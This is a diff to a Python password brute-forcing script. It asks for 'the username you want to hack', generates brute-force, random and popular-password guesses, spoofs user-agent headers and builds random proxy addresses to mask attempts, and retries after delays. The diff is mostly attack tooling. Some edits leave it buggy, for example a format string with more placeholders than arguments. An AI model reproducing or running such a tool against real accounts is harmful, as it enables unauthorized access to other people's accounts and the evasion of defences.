@@ -22,7 +22,7 @@ import os
 ''' Basic configure of logs '''
 logging.basicConfig(level = logging.DEBUG,
 					format='%(asctime)s : %(levelname)s : %(message)s',
-					filename = r'..\logs.log',
+					filename = r'logs.log',
 					filemode = 'w')
 
 ''' Proxy '''
@@ -131,12 +131,12 @@ class InquiryFromUser:
 		logging.debug('def "check"')
 		global len_of_password
 		if len(str(length)) == 0:
-			length = 4
+			length = len_of_password
 		elif length < 0:
 			length = InquiryFromUser.min_length()
 			length = InquiryFromUser.check(length)
 		else:
-			length = len_of_password
+			pass
 
 		logging.info('length = {}'.format(length))
 		logging.debug('return "length"')
@@ -220,6 +220,7 @@ def generate_popular_password(length):
 
 # noinspection PyShadowingNames
 def generate_brute_forced_passwords(alphabet, length, n = None, password_0 = None):
+	logging.info('def "generate_brute_forced_passwords"')
 	base = len(alphabet)
 	logging.info('base = {}'.format(base))
 	if password_0 is None:
@@ -263,12 +264,12 @@ def random_choice(length, alphabet):
 	logging.info('base = {}, password = {}'.format(base, password))
 	for i in range(length):
 		password += random.choice(alphabet)
-		logging.debug('password = {}'.format(password))
-	count = length ** base
-	logging.debug('count = {}'.format(count))
+	logging.debug('password = {}'.format(password))
+	number = 'many'
+	logging.debug('many')
 
-	logging.debug('return "password" = "{}", "length" = "{}", "count" = "{}"'.format(password, length, count))
-	return password, length, count
+	logging.debug('return "password" = "{}", "length" = "{}"'.format(password, length))
+	return password, length, number
 
 
 ''' Proxies for work '''
@@ -290,13 +291,13 @@ def proxy_generator():
 		stringproxy.append(char)
 		stringproxy.append('.')
 		logging.debug('stringproxy = {}'.format(stringproxy))
-	char = str(random.randint(1, 10000))
-	logging.debug('char = {}'.format(char))
-	del stringproxy[-1]
-	stringproxy.append(':')
-	stringproxy.append(char)
-	stringproxy = ''.join(stringproxy)
-	logging.debug('stringproxy = {}'.format(stringproxy))
+	# char = str(random.randint(1, 10000))
+	# logging.debug('char = {}'.format(char))
+	# del stringproxy[-1]
+	# stringproxy.append(':')
+	# stringproxy.append(char)
+	# stringproxy = ''.join(stringproxy)
+	# logging.debug('stringproxy = {}'.format(stringproxy))
 	proxies['http'] = stringproxy
 	logging.debug('proxies["http"] = {}'.format(proxies['http']))
 
@@ -313,20 +314,20 @@ def proxy_generator():
 		stringproxy.append(char)
 		stringproxy.append('.')
 		logging.debug('stringproxy = {}'.format(stringproxy))
-	char = str(random.randint(1, 10000))
-	logging.debug('char = {}'.format(char))
-	del stringproxy[-1]
-	stringproxy.append(':')
-	stringproxy.append(char)
-	stringproxy = ''.join(stringproxy)
-	logging.debug('stringproxy = {}'.format(stringproxy))
-	proxies['https'] = stringproxy
-	logging.debug('proxies["https"] = {}'.format(proxies['https']))
+	# char = str(random.randint(1, 10000))
+	# logging.debug('char = {}'.format(char))
+	# del stringproxy[-1]
+	# stringproxy.append(':')
+	# stringproxy.append(char)
+	# stringproxy = ''.join(stringproxy)
+	# logging.debug('stringproxy = {}'.format(stringproxy))
+	# proxies['https'] = stringproxy
+	# logging.debug('proxies["https"] = {}'.format(proxies['https']))
 
 	head = possible_head[random.randint(0, len(possible_head))]
 	logging.debug('head = {}'.format(head))
 
-	logging.debug('return "proxies" = {}, "head" = {}'.format(proxies, head))
+	logging.debug('return "proxies", "head"')
 	return proxies, head
 
 
@@ -335,8 +336,7 @@ def proxy_generator():
 def custom_server(login, password):
 	logging.debug('def "custom_server"')
 	proxy, head = proxy_generator()
-	logging.debug('proxy = {}, head = {}'.format(proxy, head))
-	headers = {'User-Agent' : head, 'proxies' : proxy }
+	headers = {'user-agent' : head}
 	logging.debug('headers = {}'.format(headers))
 	status = False
 	logging.debug('status = {}'.format(status))
@@ -390,8 +390,8 @@ def custom_server(login, password):
 			logging.debug('status = {}'.format(status))
 			time.sleep(60)
 		# посмотреть, как правильно называется ошибка
-		finally:
-			break
+		# finally:
+		# 	break
 
 	logging.debug('return "status" = {}'.format(status))
 	return status
@@ -402,7 +402,7 @@ def custom_server(login, password):
 class Variables:
 	logging.debug('New class "Variables"')
 	# 1 1
-	# noinspection PyShadowingNames
+	# noinspection PyShadowingNames,PyUnboundLocalVariable
 	@staticmethod
 	def login_with_bruteforce(run_of_question, alphabet, password_0):
 		logging.debug('def "login_with_bruteforce"')
@@ -416,11 +416,18 @@ class Variables:
 			logging.debug('length = {}'.format(length))
 			wrongpasswords = InquiryFromUser.wrongpasswords()
 			logging.debug('"wrongpasswords" complete')
-			login = input('Enter the username you want to hack: ')
-			logging.debug('Login: {}'.format(login))
-			with open('for_bruteforce.txt', 'wb') as f:
-				pickle.dump(login, f)
-				logging.debug('"login" pickled')
+			while True:
+				print('\rEnter the username you want to hack:', end = ' ')
+				login = input()
+				if len(login) > 0:
+					logging.debug('length = {}, login = {}, wrongpasswords complete'.format(length, login))
+					with open('for_bruteforce.txt', 'wb') as f:
+						pickle.dump(login, f)
+						logging.debug('"login" pickled')
+					break
+				else:
+					continue
+
 		else:
 			with open('for_bruteforce.txt', 'rb') as f:
 				login = pickle.load(f)
@@ -495,7 +502,7 @@ class Variables:
 						break
 					else:
 						l += 1
-						string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l, number)
+						string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
 						print(string, end='')
 						logging.info('Wrong password')
 						logging.debug('{}'.format(string))
@@ -504,13 +511,14 @@ class Variables:
 						k += 1
 						logging.debug('k = {}'.format(k))
 						if k == base:
-							logging.debug('"k" = "base"')
-							k = 0
-							logging.debug('k = {}'.format(k))
-							with open('wrongpasswords.txt', 'a') as f:
-								for i in wrongpasswords:
-									f.write('\n'.join(i))
-								logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+								logging.debug('"k" = "base"')
+								k = 0
+								logging.debug('k = {}'.format(k))
+								with open('wrongpasswords.txt', 'a') as f:
+									for i in wrongpasswords:
+										f.write(i + '\n')
+									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+						break
 
 	# 1 2
 	# noinspection PyShadowingNames
@@ -524,8 +532,17 @@ class Variables:
 		if run_of_questions:
 			length = InquiryFromUser.min_length()
 			wrongpasswords = InquiryFromUser.wrongpasswords()
-			login = input('Enter the username you want to hack: ')
-			logging.debug('length = {}, login = {}, wrongpasswords complete'.format(length, login))
+			while True:
+				print('\rEnter the username you want to hack:', end = ' ')
+				login = input()
+				if len(login) > 0:
+					logging.debug('length = {}, login = {}, wrongpasswords complete'.format(length, login))
+					with open('for_bruteforce.txt', 'wb') as f:
+						pickle.dump(login, f)
+						logging.debug('"login" pickled')
+					break
+				else:
+					continue
 		else:
 			with open('for_bruteforce.txt', 'rb') as f:
 				login = pickle.load(f)
@@ -580,7 +597,7 @@ class Variables:
 						break
 					else:
 						l += 1
-						string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l, number)
+						string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
 						print(string, end='')
 						logging.info('Wrong password')
 						logging.debug('{}'.format(string))
@@ -589,13 +606,14 @@ class Variables:
 						k += 1
 						logging.debug('k = {}'.format(k))
 						if k == base:
-							logging.debug('"k" = "base"')
-							k = 0
-							logging.debug('k = {}'.format(k))
-							with open('wrongpasswords.txt', 'a') as f:
-								for i in wrongpasswords:
-									f.write('\n'.join(i))
-								logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+								logging.debug('"k" = "base"')
+								k = 0
+								logging.debug('k = {}'.format(k))
+								with open('wrongpasswords.txt', 'a') as f:
+									for i in wrongpasswords:
+										f.write(i + '\n')
+									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+						break
 
 	# 1 3
 	# noinspection PyShadowingNames, PyPep8Naming
@@ -609,17 +627,24 @@ class Variables:
 		if run_of_questions:
 			length = InquiryFromUser.min_length()
 			wrongpasswords = InquiryFromUser.wrongpasswords()
-			login = input('Enter the username you want to hack: ')
-			logging.debug('length = {}, login = {}, wrongpasswords complete'.format(length, login))
-			with open('for_bruteforce.txt', 'wb') as f:
-				pickle.dump(login, f)
+			while True:
+				print('\rEnter the username you want to hack:', end = ' ')
+				login = input()
+				if len(login) > 0:
+					logging.debug('length = {}, login = {}, wrongpasswords complete'.format(length, login))
+					with open('for_bruteforce.txt', 'wb') as f:
+						pickle.dump(login, f)
+						logging.debug('"login" pickled')
+					break
+				else:
+					continue
 		else:
 			with open('for_bruteforce.txt', 'rb') as f:
 				login = pickle.load(f)
 				logging.debug('"login" pickled')
 			length = len_of_password
 		print('\nStarting the search')
-		time.sleep(2)
+		# time.sleep(2)
 		logging.debug('password_0 = {}'.format(password_0))
 		if password_0 is not None:
 			password, length, n = password_0
@@ -639,7 +664,7 @@ class Variables:
 			logging.debug('"login_generator" = {} and "generate_password" = {} write in file "variable.txt"'.format(login_generator, generate_password))
 		while True:
 			password, length, number = random_choice(length, alphabet)
-			logging.debug('password = {}, length = {}, number = {}'.format(password, length, number))
+			logging.debug('password = {}, length = {}'.format(password, length))
 			if k == (base ** length):
 				length += 1
 				k = 1
@@ -685,9 +710,9 @@ class Variables:
 							logging.debug('k = {}'.format(k))
 							with open('wrongpasswords.txt', 'a') as f:
 								for i in wrongpasswords:
-									f.write('\n'.join(i))
+									f.write(i + '\n')
 								logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
-						continue
+						break
 			else:
 				pass
 
@@ -712,7 +737,7 @@ class Variables:
 		if password_0 is not None:
 			password, length, n = password_0
 			logging.debug('password = {}, length = {}, n = {}'.format(password, length, n))
-		
+
 		k = 0
 		l = 1
 		logging.debug('k = {}, l = {}'.format(k ,l))
@@ -758,7 +783,7 @@ class Variables:
 							break
 						else:
 							l += 1
-							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l, number)
+							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
 							print(string, end='')
 							logging.info('Wrong password')
 							logging.debug('{}'.format(string))
@@ -772,8 +797,9 @@ class Variables:
 								logging.debug('k = {}'.format(k))
 								with open('wrongpasswords.txt', 'a') as f:
 									for i in wrongpasswords:
-										f.write('\n'.join(i))
+										f.write(i + '\n')
 									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+							break
 
 	# 2 2
 	# noinspection PyShadowingNames
@@ -831,7 +857,7 @@ class Variables:
 							break
 						else:
 							l += 1
-							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l, number)
+							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
 							print(string, end='')
 							logging.info('Wrong password')
 							logging.debug('{}'.format(string))
@@ -845,8 +871,9 @@ class Variables:
 								logging.debug('k = {}'.format(k))
 								with open('wrongpasswords.txt', 'a') as f:
 									for i in wrongpasswords:
-										f.write('\n'.join(i))
+										f.write(i + '\n')
 									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
+							break
 
 	# 2 3
 	# noinspection PyPep8Naming, PyShadowingNames
@@ -885,7 +912,7 @@ class Variables:
 			logging.debug('"login_generator" = {} and "generate_password" = {} write in file "variable.txt"'.format(login_generator, generate_password))
 		while True:
 			password, length, number = random_choice(length, alphabet)
-			logging.debug('password = {}, length = {}, number = {}'.format(password, length, number))
+			logging.debug('password = {}, length = {}'.format(password, length))
 			k += 1
 			if k == (base ** length):
 				length += 1
@@ -920,7 +947,7 @@ class Variables:
 							break
 						else:
 							l += 1
-							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l, number)
+							string = '\rLogin: {0} Password: {1}\t{2} of {3} - FAIL'.format(login, password, l)
 							print(string, end='')
 							logging.info('Wrong password')
 							logging.debug('{}'.format(string))
@@ -934,11 +961,12 @@ class Variables:
 								logging.debug('k = {}'.format(k))
 								with open('wrongpasswords.txt', 'a') as f:
 									for i in wrongpasswords:
-										f.write('\n'.join(i))
+										f.write(i + '\n')
 									logging.debug('"wrongpasswords" wrote in file "wrongpasswords.txt"')
-								continue
 							else:
 								pass
+							break
+
 
 
 '''Основная функция'''
